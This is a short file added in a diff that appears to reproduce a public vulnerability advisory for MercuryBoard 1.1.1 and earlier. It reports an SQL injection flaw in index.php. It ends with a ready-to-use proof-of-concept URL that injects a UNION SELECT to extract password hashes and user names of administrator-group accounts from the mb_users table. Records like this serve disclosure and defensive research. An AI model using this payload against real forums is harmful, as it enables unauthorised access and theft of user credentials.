@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/12503/info
+
+MercuryBoard is affected by an SQL injection vulnerability. This issue is due to the application failing to properly sanitize user-supplied input before being used in SQL queries.
+
+The vulnerability is reported to affect the 'index.php' script.
+
+MercuryBoard 1.1.1 and prior versions are affected by this vulnerability. 
+
+http://www.example.com/mercuryboard/index.php?a=post&s=reply&t=1&qu=10000%20UNION
+%20SELECT%20user_password,user_name%20from%20mb_users%20where%20user_group%20
+=%201%20limit%201/* 
